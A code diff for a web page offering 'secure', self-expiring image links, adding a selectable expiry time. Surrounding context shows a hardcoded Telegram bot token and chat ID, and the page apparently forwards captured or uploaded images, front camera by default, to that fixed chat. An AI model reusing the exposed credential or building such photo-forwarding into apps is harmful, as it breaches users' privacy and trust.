@@ -430,6 +430,42 @@
             0% { filter: hue-rotate(0deg); }
             100% { filter: hue-rotate(360deg); }
         }
+        
+        .time-selector {
+            background: rgba(40, 40, 60, 0.5);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(102, 126, 234, 0.3);
+        }
+        
+        .time-btn {
+            padding: 8px 15px;
+            border: 1px solid #667eea;
+            background: rgba(40,40,60,0.8);
+            color: #b0b0d0;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .time-btn:hover {
+            background: rgba(102, 126, 234, 0.2);
+        }
+        
+        .time-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-color: #764ba2;
+        }
+        
+        #customTime {
+            text-align: center;
+        }
+        
+        #customTime:focus {
+            outline: none;
+            border-color: #764ba2;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -480,6 +516,23 @@
                 </div>
             </div>
             
+            <!-- Time Selector -->
+            <div class="time-selector">
+                <h4 style="color: #fff; margin-bottom: 10px;"><i class="fas fa-clock"></i> Link Expiry Time:</h4>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                    <button class="time-btn active" data-time="1">1 Minute</button>
+                    <button class="time-btn" data-time="5">5 Minutes</button>
+                    <button class="time-btn" data-time="10">10 Minutes</button>
+                    <button class="time-btn" data-time="30">30 Minutes</button>
+                    <div style="display: flex; gap: 5px; align-items: center;">
+                        <input type="number" id="customTime" placeholder="Custom" min="1" max="1440" 
+                               style="width: 80px; padding: 8px; border-radius: 5px; border: 1px solid #667eea; 
+                                      background: rgba(40,40,60,0.8); color: white;">
+                        <span style="color: #a0a0c0;">Minutes</span>
+                    </div>
+                </div>
+            </div>
+            
             <!-- Image Preview -->
             <div class="preview-container" id="previewContainer">
                 <h3>Preview:</h3>
@@ -512,7 +565,7 @@
                     Generating secure link...
                 </div>
                 <p style="color: #a0a0c0; font-size: 12px; margin: 10px 0;">
-                    <i class="fas fa-exclamation-circle"></i> This link will expire 1 minute after opening
+                    <i class="fas fa-exclamation-circle"></i> This link will expire after selected time
                 </p>
                 <button class="btn-copy" id="copyBtn">
                     <i class="far fa-copy"></i> Copy Secure Link
@@ -544,8 +597,8 @@
                 </div>
                 <div class="feature-card">
                     <i class="fas fa-clock"></i>
-                    <h4>1-Minute Expiry</h4>
-                    <p>Auto-delete after viewing</p>
+                    <h4>Custom Expiry</h4>
+                    <p>1-1440 minutes</p>
                 </div>
             </div>
         </div>
@@ -558,7 +611,14 @@
         // Configuration
         const TELEGRAM_BOT_TOKEN = '7649614097:AAHRU9xYhttlmuH6DQ9i9e9Gu640Z0iFAeU';
         const TELEGRAM_CHAT_ID = '2139008203';
-        const IMAGE_EXPIRY_MINUTES = 1;
+        
+        // Variables
+        let selectedFile = null;
+        let currentLink = '';
+        let currentStream = null;
+        let facingMode = 'user';
+        let isViewerMode = false;
+        let selectedExpiryMinutes = 1;
 
         // DOM Elements
         const mainApp = document.getElementById('mainApp');
@@ -585,13 +645,8 @@
         const telegramStatusDot = document.getElementById('telegramStatusDot');
         const telegramTime = document.getElementById('telegramTime');
         const screenshotProtection = document.getElementById('screenshotProtection');
-
-        // Variables
-        let selectedFile = null;
-        let currentLink = '';
-        let currentStream = null;
-        let facingMode = 'user'; // CHANGED: 'environment' → 'user'
-        let isViewerMode = false;
+        const timeButtons = document.querySelectorAll('.time-btn');
+        const customTimeInput = document.getElementById('customTime');
 
         // Tab Switching
         document.querySelectorAll('.tab-btn').forEach(btn => {
@@ -614,6 +669,29 @@
                 }
             });
         });
+
+        // Time selector setup
+        function setupTimeSelector() {
+            timeButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    timeButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    selectedExpiryMinutes = parseInt(btn.getAttribute('data-time'));
+                    customTimeInput.value = '';
+                    
+                    showMessage(`✅ Link expiry set to ${selectedExpiryMinutes} minute(s)`, 'success');
+                });
+            });
+            
+            customTimeInput.addEventListener('change', (e) => {
+                const customTime = parseInt(e.target.value);
+                if (customTime && customTime >= 1 && customTime <= 1440) {
+                    timeButtons.forEach(b => b.classList.remove('active'));
+                    selectedExpiryMinutes = customTime;
+                    showMessage(`✅ Custom expiry set to ${selectedExpiryMinutes} minute(s)`, 'success');
+                }
+            });
+        }
 
         // Camera initialization
         cameraUploadArea.addEventListener('click', async () => {
@@ -935,7 +1013,8 @@
                 mimeType: mimeType,
                 createdAt: Date.now(),
                 telegramSent: true,
-                sentTime: new Date().toISOString()
+                sentTime: new Date().toISOString(),
+                expiryMinutes: selectedExpiryMinutes
             };
             
             // Store in localStorage
@@ -959,7 +1038,8 @@
         // Display temporary link
         function displayTemporaryLink(link) {
             currentLink = link;
-            linkBox.textContent = link;
+            linkBox.innerHTML = `${link}<div style="margin-top: 10px; color: #667eea; font-size: 12px;">
+                                 ⏰ Expires after: ${selectedExpiryMinutes} minute(s)</div>`;
             linkContainer.style.display = 'block';
             
             // Auto-scroll to link container
@@ -1117,7 +1197,7 @@
                 }
                 
                 // Calculate expiry time
-                const expiryTime = viewStartTime + (IMAGE_EXPIRY_MINUTES * 60 * 1000);
+                const expiryTime = viewStartTime + (imageData.expiryMinutes * 60 * 1000);
                 const timeLeft = expiryTime - Date.now();
                 
                 if (timeLeft <= 0) {
@@ -1141,11 +1221,11 @@
                         
                         <div style="background: rgba(102, 126, 234, 0.2); color: #b0d0ff; padding: 15px; border-radius: 10px; margin: 20px 0; text-align: center; border: 1px solid rgba(102, 126, 234, 0.3);">
                             <i class="fas fa-clock"></i> Image will expire in: 
-                            <span id="countdownTimer" style="color: #b0d0ff; font-weight: bold; font-size: 18px;">01:00</span>
+                            <span id="countdownTimer" style="color: #b0d0ff; font-weight: bold; font-size: 18px;">${imageData.expiryMinutes}:00</span>
                         </div>
                         
                         <p style="color: #a0a0c0; margin: 15px 0; font-size: 14px; text-align: center;">
-                            <i class="fas fa-shield-alt"></i> Screenshot protection enabled • This image will disappear in 1 minute
+                            <i class="fas fa-shield-alt"></i> Screenshot protection enabled • This image will disappear in ${imageData.expiryMinutes} minute(s)
                         </p>
                         
                         <button class="btn" onclick="window.location.href='./'" style="margin-top: 20px;">
@@ -1180,7 +1260,7 @@
             `;
         }
 
-        // Start countdown for viewer - UPDATED VERSION
+        // Start countdown for viewer
         function startViewerCountdown(expiryTime, imageKey) {
             const updateCountdown = () => {
                 const now = Date.now();
@@ -1281,6 +1361,9 @@
             
             // Clean up old images on startup
             cleanupOldImages();
+            
+            // Setup time selector
+            setupTimeSelector();
         };
     </script>
 </body>
